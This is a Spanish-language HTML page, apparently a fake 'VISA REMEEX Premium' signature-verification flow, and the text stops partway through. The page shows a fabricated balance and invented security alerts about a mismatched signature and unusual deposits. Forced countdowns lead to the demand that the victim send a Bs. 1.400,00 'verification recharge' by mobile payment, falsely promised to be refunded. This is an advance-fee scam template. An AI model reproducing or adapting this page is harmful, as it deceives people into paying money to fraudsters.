<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>VISA REMEEX Premium - Verificación de Firma</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
  <meta name="description" content="Verificación de Firma, Proceso de Seguridad Adicional. VISA REMEEX Premium." />

  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />

  <!-- Fuentes e Iconos -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />

  <style>
    :root {
      --primary: #1a1f71; /* Azul oscuro de Visa */
      --primary-dark: #0d153e; /* Azul más oscuro */
      --secondary: #3b82f6;
      --accent: #60a5fa;
      --success: #22c55e;
      --danger: #ef4444;
      --warning: #f59e0b;

      --border-white: #ffffff;
      --border-gray: #d1d5db; 
      --border-light-blue: #93c5fd; 

      --background: #f8fafc;
      --card-bg: rgba(255, 255, 255, 0.98);
      --text-primary: #0f172a;
      --text-secondary: #475569;

      --border-radius-xl: 28px;
      --border-radius-lg: 24px;
      --border-radius: 16px;
      --border-radius-sm: 12px;

      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);

      --aurora-gradient: linear-gradient(
        120deg,
        rgba(26, 31, 113, 0.4),
        rgba(25, 35, 102, 0.3),
        rgba(30, 40, 120, 0.3),
        rgba(26, 31, 113, 0.2)
      );
      background-size: 400% 400%;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      font-family: 'Inter', sans-serif;
      color: var(--text-primary);
      line-height: 1.6;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 1rem;
      overflow-x: hidden;
    }

    .container {
      max-width: 650px;
      width: 100%;
      margin-top: 2rem;
      background: var(--card-bg);
      border-radius: var(--border-radius-xl);
      box-shadow: var(--shadow);
      backdrop-filter: blur(10px);
      border: 2px solid var(--border-white);
      overflow: hidden;
      position: relative;
      opacity: 0;
      transform: scale(0.95);
      transition: opacity 0.3s ease-out, transform 0.3s ease-out;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
    }
    .container.active {
      opacity: 1;
      transform: scale(1);
    }

    @keyframes glow {
      0%, 100% {
        box-shadow: 0 0 40px rgba(26, 31, 113, 0.5), 0 0 80px rgba(26, 31, 113, 0.3);
      }
      50% {
        box-shadow: 0 0 70px rgba(26, 31, 113, 0.8), 0 0 100px rgba(26, 31, 113, 0.6);
      }
    }
    @keyframes border-blink {
      0%   { border-color: var(--border-white); }
      33%  { border-color: var(--border-gray); }
      66%  { border-color: var(--border-light-blue); }
      100% { border-color: var(--border-white); }
    }

    .header {
      text-align: center;
      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
      color: #fff;
      padding: 3rem 2rem;
      position: relative;
      overflow: hidden;
      border-top-left-radius: var(--border-radius-xl);
      border-top-right-radius: var(--border-radius-xl);
      background-image: var(--aurora-gradient);
      animation: aurora-animation 15s ease infinite;
    }
    @keyframes aurora-animation {
      0%   { background-position: 0% 50%; }
      50%  { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .header::after {
      content: "";
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.6), transparent);
      transform: skewX(-20deg);
      opacity: 0;
      z-index: 1;
      animation: header-flash 3s infinite;
    }
    @keyframes header-flash {
      0% {
        left: -100%;
        opacity: 0;
      }
      10% {
        left: -50%;
        opacity: 1;
      }
      50% {
        left: 100%;
        opacity: 1;
      }
      60% {
        left: 100%;
        opacity: 0;
      }
      100% {
        left: 100%;
        opacity: 0;
      }
    }
    .header-logo {
      display: block;
      margin: 0 auto 1rem auto;
      width: 80%;
      max-width: 400px;
      height: auto;
      position: relative;
      z-index: 2;
    }
    .header p {
      font-size: 1.2rem;
      line-height: 1.6;
      max-width: 600px;
      margin: 0 auto;
      opacity: 0.95;
      position: relative;
      z-index: 2;
    }

    /* Tarjeta de Saldo Disponible */
    .balance-card {
      background: linear-gradient(135deg, #1434CB 0%, #142C8E 100%);
      color: white;
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      margin: -2rem 1.5rem 1.5rem 1.5rem; 
      box-shadow: var(--shadow);
      transition: var(--transition);
      position: relative;
      overflow: hidden;
      z-index: 2;
    }
    .balance-card:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-lg);
    }
    .balance-card::before {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: var(--aurora-gradient);
      animation: aurora-animation 15s ease infinite;
      z-index: 0;
    }
    .balance-card::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 30px;
      background: radial-gradient(ellipse at bottom, rgba(255,255,255,0.5), transparent);
      pointer-events: none;
      z-index: 1;
    }
    .balance-card > * {
      position: relative;
      z-index: 2;
    }
    .balance-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }
    .balance-amount {
      font-size: 1.8rem;
      font-weight: 700;
      margin: 0.5rem 0 1rem 0;
      letter-spacing: -1px;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 0.4rem;
    }

    /* Partículas animadas (flujo de dinero) */
    .particle-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      overflow: hidden;
      z-index: 1;
    }
    .particle {
      position: absolute;
      bottom: 20px;
      width: 8px;
      height: 8px;
      background: radial-gradient(circle, #4ade80 0%, #1A1F71 100%);
      border-radius: 50%;
      opacity: 0.9;
      animation: floatParticles 3s linear infinite;
    }
    @keyframes floatParticles {
      0% {
        transform: translateX(0) translateY(0) scale(0.8);
        opacity: 0.8;
      }
      25% {
        opacity: 1;
      }
      100% {
        transform: translateX(120%) translateY(-100%) scale(0.3);
        opacity: 0;
      }
    }

    /* LED verde parpadeante: señal OK */
    .led-green {
      display: inline-block;
      width: 10px;
      height: 10px;
      background-color: #22c55e;
      border-radius: 50%;
      margin-left: 6px;
      animation: blinkGreen 1s infinite;
      vertical-align: middle;
    }
    @keyframes blinkGreen {
      0% { opacity: 1; }
      50% { opacity: 0.2; }
      100% { opacity: 1; }
    }

    /* Indicador de procesamiento */
    #processingIndicator {
      margin-top: 0.25rem;
      font-size: 0.85rem;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 0.4rem;
      opacity: 0.9;
    }
    .dots {
      display: inline-block;
      width: 1em;
      text-align: left;
      overflow: hidden;
    }
    @keyframes dotsAnimation {
      0% { content: ""; }
      33% { content: "."; }
      66% { content: ".."; }
      100% { content: "..."; }
    }
    .dots::before {
      content: "";
      animation: dotsAnimation 1s steps(1, end) infinite;
    }

    /* Status banner inferior */
    .status-banner {
      color: rgba(255, 255, 255, 0.9);
      font-size: 0.9rem;
      transition: opacity 0.5s;
    }
    @keyframes blinkEffect {
      0%   { color: #10B981; }
      50%  { color: #ffffff; }
      100% { color: #10B981; }
    }
    .blink {
      animation: blinkEffect 1.2s infinite;
      font-weight: 700;
    }

    /* Rotación de info adicional */
    #rotatingInfo {
      color: #fff;
      font-size: 0.88rem;
      margin-bottom: 0.5rem;
      opacity: 1;
      transition: opacity 0.5s;
      min-height: 1.2em;
    }

    /* Barra de progreso */
    .progress-bar {
      height: 16px;
      background-color: #e2e8f0;
      border-radius: var(--border-radius);
      margin: 2rem;
      overflow: hidden;
      position: relative;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
    }
    .progress-bar-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      width: 100%; /* Progreso completo */
      transition: width 0.6s ease-in-out;
      border-radius: var(--border-radius);
      position: relative;
      overflow: hidden;
    }
    .progress-bar-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: -50%;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.3);
      transform: skewX(-45deg);
      animation: move 2s linear infinite;
    }
    @keyframes move {
      0% { left: -50%; }
      100% { left: 100%; }
    }
    .progress-text {
      position: absolute;
      width: 100%;
      top: 50%;
      transform: translateY(-50%);
      text-align: center;
      font-weight: bold;
      color: #fff;
      z-index: 3;
    }

    /* Secciones con transición */
    .section-content {
      padding: 2rem;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.4s ease-out;
      display: none;
    }
    .section-content.active {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }
    .section-content h2 {
      margin-bottom: 1.5rem;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
      gap: 0.75rem;
      color: var(--primary);
    }
    .section-content h2 i {
      color: var(--primary);
      font-size: 1.3rem;
    }
    .form-group {
      margin-bottom: 1.75rem;
    }
    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: var(--text-secondary);
      font-size: 0.95rem;
    }
    .form-control {
      width: 100%;
      padding: 0.875rem 1.25rem;
      border: 2px solid #e2e8f0;
      border-radius: var(--border-radius);
      font-size: 1rem;
      background: #fff;
      transition: var(--transition);
      color: var(--text-primary);
    }
    .form-control:hover {
      border-color: #cbd5e1;
    }
    .form-control:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.2);
    }

    /* Botones y efectos estandarizados */
    .btn-container {
      display: flex;
      justify-content: flex-end;
      margin-top: 1.5rem;
      position: relative;
      width: 100%;
    }
    .btn-container2 {
      display: flex;
      justify-content: space-between;
      margin-top: 1.5rem;
      gap: 1rem;
      position: relative;
      flex-wrap: wrap;
    }
    .btn-disabled {
      opacity: 0.6;
      cursor: not-allowed;
      pointer-events: none;
    }
    
    /* Botón estandarizado con glow */
    .btn-std-container {
      position: relative;
      width: auto;
      min-width: 120px;
      height: 50px;
      margin: 0.5rem 0;
    }
    .btn-glow-effect {
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
      background-size: 200% 100%;
      border-radius: 30px;
      animation: border-glow 3s ease infinite;
      filter: blur(15px);
      opacity: 0.7;
      z-index: 0;
    }
    @keyframes border-glow {
      0%   { background-position: -100% 0; }
      50%  { background-position: 100% 0; }
      100% { background-position: -100% 0; }
    }
    .btn-glow {
      position: relative;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      overflow: hidden;
      box-shadow: 0 15px 25px rgba(0,0,0,0.3), inset 0 -4px 8px rgba(255,255,255,0.3);
      transition: all 0.3s ease, transform 0.2s ease-in-out;
      z-index: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 600;
      font-size: 1rem;
    }
    .btn-glow:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
    }
    .btn-glow-content {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    .btn-glow-initial {
      opacity: 1;
      transform: translateX(0);
    }
    .btn-glow:hover .btn-glow-initial {
      opacity: 0;
      transform: translateX(100%);
    }
    .btn-glow-hover {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      transform: translateX(-100%);
      color: white;
    }
    .btn-glow:hover .btn-glow-hover {
      opacity: 1;
      transform: translateX(0);
    }
    .btn-glow-icon {
      margin-left: 10px;
    }
    
    /* Variantes de botones */
    .btn-success {
      background: linear-gradient(135deg, var(--success), #109648);
    }
    .btn-danger {
      background: linear-gradient(135deg, var(--danger), #c81e1e);
    }
    
    /* Botón secundario para soportes y enlaces */
    .btn-support {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 0.75rem 1.5rem;
      background: white;
      color: var(--primary);
      border: 2px solid var(--primary);
      border-radius: var(--border-radius-sm);
      font-weight: 600;
      font-size: 0.95rem;
      text-decoration: none;
      transition: var(--transition);
      box-shadow: var(--shadow-sm);
    }
    .btn-support:hover {
      background: rgba(26, 31, 113, 0.05);
      transform: translateY(-2px);
      box-shadow: var(--shadow);
    }
    .btn-support i {
      margin-right: 8px;
    }

    /* Canvas de firma */
    .signature-canvas {
      border: 2px dashed var(--primary);
      border-radius: var(--border-radius-sm);
      width: 100%;
      height: 220px;
      background: #fff;
      margin-bottom: 1rem;
      position: relative;
      cursor: crosshair;
    }
    
    /* Verificación y secciones informativas */
    .verification-section {
      padding: 1.5rem;
      margin-bottom: 1.5rem;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-gray);
      background-color: #f9fafb;
    }
    .verification-section p {
      text-align: justify;
      color: var(--text-secondary);
    }
    
    /* Secciones de información */
    .info-section {
      background-color: #f9fafb;
      border-radius: var(--border-radius);
      padding: 1.5rem;
      margin-bottom: 1.5rem;
      border: 1px solid var(--border-gray);
    }
    .info-section p {
      text-align: justify;
      margin-bottom: 0.8rem;
      color: var(--text-primary);
    }
    .info-section ul, .info-section ol {
      padding-left: 1.5rem;
      margin-bottom: 1rem;
    }
    .info-section li {
      margin-bottom: 0.5rem;
      text-align: justify;
    }
    
    /* Tarjeta de datos destacados */
    .highlight-card {
      background-color: #f0f9ff;
      border-radius: var(--border-radius);
      padding: 1.25rem;
      margin: 1rem 0;
      border: 1px solid rgba(59, 130, 246, 0.2);
    }
    .highlight-card p {
      margin: 0;
      line-height: 1.5;
    }
    
    /* Título de sección secundaria estandarizado */
    .section-subtitle {
      margin-top: 1.5rem;
      margin-bottom: 1rem;
      font-size: 1.2rem;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    /* Lista con iconos */
    .icon-list {
      margin: 1rem 0;
      padding-left: 0;
      list-style: none;
    }
    .icon-list li {
      margin-bottom: 0.8rem;
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      font-size: 0.95rem;
      color: var(--text-secondary);
      text-align: justify;
    }
    .icon-list li i {
      color: var(--primary);
      font-size: 1.1rem;
      margin-top: 2px;
      flex-shrink: 0;
    }
    
    /* Blur container para datos sensibles */
    .blur-container {
      position: relative;
      cursor: pointer;
      display: block;
      margin: 1.5rem 0;
    }
    .blur-container .security-data-card {
      filter: blur(8px);
      transition: filter 0.3s;
    }
    .blur-container .blur-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--text-primary);
      font-size: 1.1rem;
      font-weight: bold;
      background: rgba(255, 255, 255, 0.5);
      border-radius: var(--border-radius-sm);
      transition: opacity 0.3s;
      pointer-events: none;
      z-index: 1;
    }
    
    /* Tarjeta de datos de seguridad */
    .security-data-card {
      background: #fff;
      border: 1px solid var(--primary);
      border-radius: var(--border-radius);
      padding: 1.5rem;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .security-data-card p {
      margin: 0.5rem 0;
      font-size: 1rem;
      color: var(--text-primary);
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .security-data-card .copy-icon {
      color: var(--primary);
      cursor: pointer;
      padding: 4px;
      border-radius: 4px;
      transition: var(--transition);
    }
    .security-data-card .copy-icon:hover {
      background-color: rgba(26, 31, 113, 0.1);
    }

    /* Overlay y Modal */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      padding: 1rem;
    }
    .overlay.active {
      display: flex;
      backdrop-filter: blur(5px);
    }
    .modal {
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 1.5rem;
      width: 90%;
      max-width: 420px;
      box-shadow: var(--shadow-lg);
      text-align: center;
      position: relative;
      backdrop-filter: blur(8px);
      border: 2px solid #fff;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
    }
    .modal h3 {
      font-size: 1.2rem;
      margin-bottom: 0.5rem;
      color: var(--primary);
    }
    .modal p {
      font-size: 0.95rem;
      color: var(--text-secondary);
      margin-bottom: 1rem;
      line-height: 1.4;
      text-align: center;
    }
    
    /* Modal con destello especial */
    .modal.modal-glow {
      background: #fff !important;
      box-shadow: 0 0 60px rgba(20, 52, 203, 0.5), 0 0 120px rgba(20, 52, 203, 0.3) !important;
      animation: glow 3s ease infinite, border-blink 3s linear infinite !important;
    }
    
    /* Barra de progreso para overlays */
    .overlay-progress-bar {
      height: 8px;
      background-color: #e2e8f0;
      border-radius: var(--border-radius);
      margin: 1rem 0;
      overflow: hidden;
      position: relative;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
    }
    .overlay-progress-fill {
      height: 100%;
      background: var(--success);
      width: 0%; /* Inicia en 0 */
      transition: width 0.3s linear;
      border-radius: var(--border-radius);
    }
    .overlay-progress-fill.error {
      background: var(--danger);
    }
    
    /* Firma en miniatura */
    .mini-signature {
      max-width: 120px;
      max-height: 60px;
      border: 1px solid #ccc;
      margin: 0.5rem auto;
      border-radius: 4px;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { opacity: 0.6; }
      50% { opacity: 1; }
      100% { opacity: 0.6; }
    }

    /* Cuenta regresiva */
    .countdown {
      font-size: 0.85rem;
      color: var(--text-secondary);
      margin-top: 0.5rem;
      text-align: center;
    }

    /* Responsive */
    @media (max-width: 768px) {
      .header {
        padding: 2rem 1rem;
      }
      .header-logo {
        width: 70%;
        max-width: 300px;
      }
      .balance-card {
        margin: -2rem 1rem 1.5rem 1rem;
      }
      .progress-bar {
        margin: 1.5rem 1rem;
      }
      .btn-std-container {
        width: 100%;
      }
      .btn-container {
        width: 100%;
        justify-content: center;
      }
      .btn-container2 {
        flex-direction: column;
        align-items: center;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <!-- Encabezado principal -->
  <div class="header">
    <img 
      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png"
      alt="REMEEX VISA Logo" class="header-logo"
    >
    <p>Envía dinero al instante sin comisiones</p>
  </div>

  <!-- Tarjeta con Saldo disponible -->
  <div class="balance-card">
    <!-- Contenedor de partículas -->
    <div class="particle-container" id="particleContainer"></div>

    <div class="balance-header">
      <h2>Saldo disponible</h2>
      <!-- Tasa de cambio y bandera -->
      <div style="display:flex; align-items:center; gap:0.5rem;">
        <span id="exchangeRateText" style="font-size: 0.85rem;">Tasa: --</span>
        <img src="https://flagcdn.com/w20/ve.png" alt="Bandera de Venezuela" style="width:20px; height:auto;">
      </div>
    </div>
    <div class="balance-amount" id="balanceAmount">0,00 Bs.</div>

    <!-- Rotación de info -->
    <div id="rotatingInfo"></div>

    <!-- Indicador de procesamiento -->
    <div id="processingIndicator">
      Procesando transferencia<span class="dots"></span>
      <span class="led-green"></span>
    </div>

    <div class="status-banner" id="statusBanner"></div>
  </div>

  <!-- Barra de progreso con texto -->
  <div class="progress-bar">
    <div class="progress-bar-fill" id="progressBarFill"></div>
    <span class="progress-text" id="progressText">Verificación adicional</span>
  </div>

  <!-- STEP 1: Nueva oportunidad para firmar -->
  <div class="section-content active" id="signatureVerification">
    <h2><i class="fas fa-file-signature"></i> Verificación de Firma</h2>
    
    <div class="verification-section">
      <p style="color: var(--text-secondary); margin-bottom: 1rem;">
        <i class="fas fa-exclamation-circle" style="color:var(--warning);"></i>
        <strong>Tu firma anterior no coincide con la que tenemos registrada.</strong>
      </p>
      
      <p style="margin-bottom:1rem;">
        Por razones de seguridad, te ofrecemos una segunda oportunidad para firmar.
        Tu firma debe coincidir con la de tu documento de identidad para autorizar esta transacción.
      </p>
      
      <p>
        Por favor, intenta firmar con más precisión. Si la firma aún no coincide, 
        deberás pasar por un proceso de verificación adicional para garantizar la seguridad 
        de tus fondos.
      </p>
    </div>

    <p style="margin-bottom: 1.5rem; color: var(--text-secondary); text-align: center;">
      <i class="fas fa-shield-alt" style="color:var(--primary);"></i>
      Este es un procedimiento estándar para proteger tu seguridad y evitar fraudes.
      <br>
      <strong>No cierres esta página ni retrocedas durante el proceso.</strong>
    </p>

    <!-- Canvas de firma -->
    <canvas class="signature-canvas" id="signatureCanvas"></canvas>

    <div style="display: flex; gap: 1rem; margin-bottom: 1rem; justify-content: center;">
      <div class="btn-std-container" style="width: 140px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-danger" id="clearSignatureBtn">
          <div class="btn-glow-content btn-glow-initial">
            Limpiar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Limpiar
            <i class="fas fa-eraser btn-glow-icon"></i>
          </div>
        </button>
      </div>
      
      <div class="btn-std-container" style="width: 140px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-success" id="saveSignatureBtn">
          <div class="btn-glow-content btn-glow-initial">
            Guardar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Guardar
            <i class="fas fa-save btn-glow-icon"></i>
          </div>
        </button>
      </div>
    </div>
  </div>

  <!-- STEP 2: Verificación de Seguridad 1 -->
  <div class="section-content" id="securityVerification1">
    <h2><i class="fas fa-shield-alt"></i> Verificación de Seguridad</h2>
    
    <div class="info-section">
      <p id="securityVerificationText1">
        Tu firma no coincide con la que aparece en tu documento de identidad.
        Por seguridad, necesitamos validar que eres el titular legítimo de 
        la cuenta antes de procesar tu solicitud.
      </p>

      <p>
        Serás dirigido(a) a una sección de seguridad para confirmar tu titularidad.
        Este proceso es rápido y sencillo, diseñado para proteger tus fondos y 
        prevenir transacciones no autorizadas.
      </p>
      
      <p>
        <strong>Importante:</strong> No cierres esta ventana ni retrocedas durante 
        el proceso de verificación.
      </p>
    </div>
    
    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 220px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurityBtn1" disabled>
          <div class="btn-glow-content btn-glow-initial">
            Acepto, Quiero continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Acepto, Quiero continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity1">
        Lee detenidamente y espera 30 segundos para continuar...
      </div>
    </div>
  </div>

  <!-- STEP 3: Verificación de Seguridad 2 -->
  <div class="section-content" id="securityVerification2">
    <h2><i class="fas fa-question-circle"></i> ¿Por qué esta verificación?</h2>
    
    <div class="info-section">
      <p>
        La verificación adicional es un mecanismo de seguridad que garantiza 
        la protección de tus fondos y tu identidad.
      </p>
      
      <ul class="icon-list">
        <li><i class="fas fa-user-shield"></i> Previene intentos de suplantación de identidad y accesos no autorizados.</li>
        <li><i class="fas fa-lock"></i> Evita que personas no autorizadas puedan acceder a tu cuenta.</li>
        <li><i class="fas fa-ban"></i> Reduce el riesgo de bloqueos o retenciones en tu banco por transacciones sospechosas.</li>
        <li><i class="fas fa-gavel"></i> Cumple con la normativa legal de seguridad bancaria que protege tus intereses.</li>
        <li><i class="fas fa-shield-alt"></i> Establece una capa adicional de protección para transacciones de alto valor.</li>
      </ul>
    </div>
    
    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 180px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurityBtn2" disabled>
          <div class="btn-glow-content btn-glow-initial">
            Entendido, Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Entendido, Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity2">
        Disponible en unos momentos...
      </div>
    </div>
  </div>

  <!-- STEP 4A: Tu dinero está listo, pero hay un detalle importante -->
  <div class="section-content" id="securityVerification3A">
    <h2><i class="fas fa-info-circle"></i> Tu dinero está listo, pero hay un detalle importante</h2>
    
    <div class="info-section">
      <p>
        <strong id="nombreUsuarioAviso" style="color: var(--primary);">[NombreCompleto]</strong>,
        tenemos todo listo para enviarte tu dinero a <strong class="nombreBancoUsuario">[Banco]</strong>.
        Sin embargo, hay dos alertas de seguridad que debemos resolver:
      </p>

      <ol style="margin: 1.5rem 0; color: var(--text-primary);">
        <li style="margin-bottom:1rem;">
          <strong>Tu firma no coincidió</strong> con la registrada en el sistema, y por seguridad,
          no pudimos confirmar tu identidad como titular de la cuenta bancaria en 
          <strong class="nombreBancoUsuario"></strong>.
        </li>
        <li>
          <strong class="nombreBancoUsuario"></strong> ha detectado que normalmente
          no recibes depósitos de montos elevados en tu cuenta <em class="numeroCuentaUsuario"></em>,
          lo que ha activado una alerta automática de seguridad.
        </li>
      </ol>

      <p style="margin-top: 1rem;">
        <i class="fas fa-exclamation-circle" style="color:var(--warning);"></i>
        <strong>No te preocupes.</strong> Este es un procedimiento estándar diseñado para protegerte.
        Solo necesitas completar una verificación rápida para confirmar que eres el titular
        legítimo de la cuenta y asegurar que puedas recibir tus fondos sin problemas.
      </p>
    </div>

    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 160px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurity3ABtn" disabled>
          <div class="btn-glow-content btn-glow-initial">
            Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity3A">
        Lee detenidamente y espera para continuar...
      </div>
    </div>
  </div>

  <!-- STEP 4B: Verificación rápida desde tu banco -->
  <div class="section-content" id="securityVerification3B">
    <h2><i class="fas fa-user-check"></i> Verificación rápida desde tu banco</h2>
    
    <div class="info-section">
      <p>
        Para resolver estas alertas de seguridad y garantizar que recibas tus
        <strong id="saldoRequerido">[Saldo en Bs]</strong> sin inconvenientes,
        necesitamos confirmar que tienes acceso a tu cuenta en 
        <strong class="nombreBancoUsuario">[Banco]</strong>.
      </p>

      <div style="margin: 1rem 0;">
        <i class="fas fa-credit-card" style="color:var(--success); margin-right: 0.5rem;"></i>
        <span style="color: var(--text-primary);">
          Esta verificación eliminará las restricciones y permitirá que tu depósito
          se procese de forma inmediata y segura.
        </span>
      </div>

      <div class="highlight-card">
        <p style="font-weight: 500; color: var(--text-primary);">
          <i class="fas fa-shield-alt" style="color:var(--primary); margin-right: 0.5rem;"></i> 
          Este procedimiento protege tu dinero y evita fraudes.
        </p>
        <p style="font-weight: 500; color: var(--text-primary); margin-top: 0.5rem;">
          <i class="fas fa-check-circle" style="color:var(--success); margin-right: 0.5rem;"></i> 
          Es rápido y seguro, sin trámites complicados.
        </p>
        <p style="font-weight: 500; color: var(--text-primary); margin-top: 0.5rem;">
          <i class="fas fa-money-bill-wave" style="color:var(--success); margin-right: 0.5rem;"></i> 
          Recibirás el dinero inmediatamente después de la verificación.
        </p>
      </div>
    </div>

    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 160px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurity3BBtn" disabled>
          <div class="btn-glow-content btn-glow-initial">
            Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity3B">
        Disponible en unos momentos...
      </div>
    </div>
  </div>

  <!-- STEP 4C: Último paso para recibir tu dinero en minutos -->
  <div class="section-content" id="securityVerification3C">
    <h2><i class="fas fa-flag-checkered"></i> Último paso para recibir tu dinero en minutos</h2>
    
    <div class="info-section">
      <p>
        Para confirmar que eres el titular de la cuenta y eliminar la alerta de seguridad, 
        sigue estos pasos:
      </p>

      <ol style="color: var(--text-primary); margin: 1rem 0 1.5rem 1.5rem;">
        <li style="margin-bottom:1rem;">
          Desde tu cuenta en <strong class="nombreBancoRecarga">[Banco]</strong>,
          realiza una recarga de verificación por <strong class="blink">Bs. 1.400,00</strong>. 
          <strong>Este monto será reembolsado</strong> junto con tu saldo disponible.
        </li>
        <li>
          En el concepto del comprobante de pago móvil escribe: 
          <strong id="conceptoPagoMovil">[Número de Identificación]</strong>.
        </li>
      </ol>

      <div class="highlight-card">
        <p style="font-weight: 500;">
          <i class="fas fa-calculator" style="margin-right: 0.5rem;"></i>
          <strong>Monto total que recibirás:</strong>
          <br>
          <span style="display: block; text-align: center; margin-top: 0.5rem; font-size: 1.1rem;">
            <strong id="montoRetiroBs">[Saldo]</strong> + 
            <strong class="blink">Bs. 1.400,00</strong> = 
            <strong id="montoDepositoTotal">[Saldo+1400]</strong>
          </span>
        </p>
      </div>
    </div>

    <h3 class="section-subtitle">
